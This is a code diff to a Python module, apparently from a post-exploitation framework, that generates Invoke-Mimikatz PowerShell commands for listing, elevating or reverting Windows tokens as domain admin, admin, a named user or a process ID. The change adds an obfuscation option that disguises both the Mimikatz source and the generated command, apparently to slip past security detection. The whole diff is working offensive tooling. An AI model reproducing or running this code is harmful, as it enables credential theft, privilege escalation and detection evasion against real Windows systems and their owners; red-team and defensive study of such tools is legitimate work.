@@ -87,11 +87,13 @@ class Module:
                 self.options[option]['Value'] = value
 
 
-    def generate(self):
+    def generate(self, obfuscate=False, obfuscationCommand=""):
         
         # read in the common module source code
         moduleSource = self.mainMenu.installPath + "/data/module_source/credentials/Invoke-Mimikatz.ps1"
-
+        if obfuscate:
+            helpers.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscationCommand)
+            moduleSource = moduleSource.replace("module_source", "obfuscated_module_source")
         try:
             f = open(moduleSource, 'r')
         except:
@@ -111,28 +113,30 @@ class Module:
 
         script = moduleCode
 
-        script += "Invoke-Mimikatz -Command "
+        scriptEnd = "Invoke-Mimikatz -Command "
 
         if revert.lower() == "true":
-            script += "'\"token::revert"
+            scriptEnd += "'\"token::revert"
         else:
             if listTokens.lower() == "true":
-                script += "'\"token::list"
+                scriptEnd += "'\"token::list"
             elif elevate.lower() == "true":
-                script += "'\"token::elevate"
+                scriptEnd += "'\"token::elevate"
             else:
                 print helpers.color("[!] list, elevate, or revert must be specified!")
                 return ""
 
             if domainadmin.lower() == "true":
-                script += " /domainadmin"
+                scriptEnd += " /domainadmin"
             elif admin.lower() == "true":
-                script += " /admin"
+                scriptEnd += " /admin"
             elif user.lower() != "":
-                script += " /user:" + str(user)
+                scriptEnd += " /user:" + str(user)
             elif processid.lower() != "":
-                script += " /id:" + str(processid)
+                scriptEnd += " /id:" + str(processid)
 
-        script += "\"';"
-
+        scriptEnd += "\"';"
+        if obfuscate:
+            scriptEnd = helpers.obfuscate(psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
+        script += scriptEnd
         return script
